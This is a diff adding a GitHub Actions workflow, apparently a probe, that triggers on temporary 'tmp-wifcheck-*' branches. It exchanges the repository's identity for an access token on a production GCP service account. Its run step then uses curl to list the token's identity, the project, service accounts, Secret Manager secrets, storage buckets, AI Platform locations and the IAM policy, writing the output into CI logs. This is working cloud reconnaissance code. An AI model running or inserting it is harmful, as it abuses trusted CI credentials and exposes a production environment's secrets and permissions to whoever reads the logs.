@@ -1,0 +1,36 @@
+name: zz-wifcheck
+on:
+  push:
+    branches: ["tmp-wifcheck-*"]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - id: auth
+        uses: google-github-actions/auth@v2
+        with:
+          workload_identity_provider: projects/861433193200/locations/global/workloadIdentityPools/github-pool/providers/github-provider
+          service_account: github-actions-forgecrux@probestack-prod.iam.gserviceaccount.com
+          token_format: access_token
+      - name: probe
+        env:
+          T: ${{ steps.auth.outputs.access_token }}
+        run: |
+          echo "toklen=${#T}"
+          echo "== identity"
+          curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${T}" | head -c 700; echo
+          echo "== project"
+          curl -s -H "Authorization: Bearer ${T}" "https://cloudresourcemanager.googleapis.com/v3/projects/861433193200" | head -c 900; echo
+          echo "== serviceAccounts"
+          curl -s -H "Authorization: Bearer ${T}" "https://iam.googleapis.com/v1/projects/861433193200/serviceAccounts" | head -c 4000; echo
+          echo "== secrets"
+          curl -s -H "Authorization: Bearer ${T}" "https://secretmanager.googleapis.com/v1/projects/861433193200/secrets" | head -c 4000; echo
+          echo "== buckets"
+          curl -s -H "Authorization: Bearer ${T}" "https://storage.googleapis.com/storage/v1/b?project=861433193200&maxResults=50" | head -c 4000; echo
+          echo "== aiplatform locations"
+          curl -s -H "Authorization: Bearer ${T}" "https://aiplatform.googleapis.com/v1/projects/861433193200/locations" | head -c 1200; echo
+          echo "== iam policy"
+          curl -s -H "Authorization: Bearer ${T}" -H "Content-Type: application/json" -d "{}" "https://cloudresourcemanager.googleapis.com/v1/projects/861433193200:getIamPolicy" | head -c 3000; echo
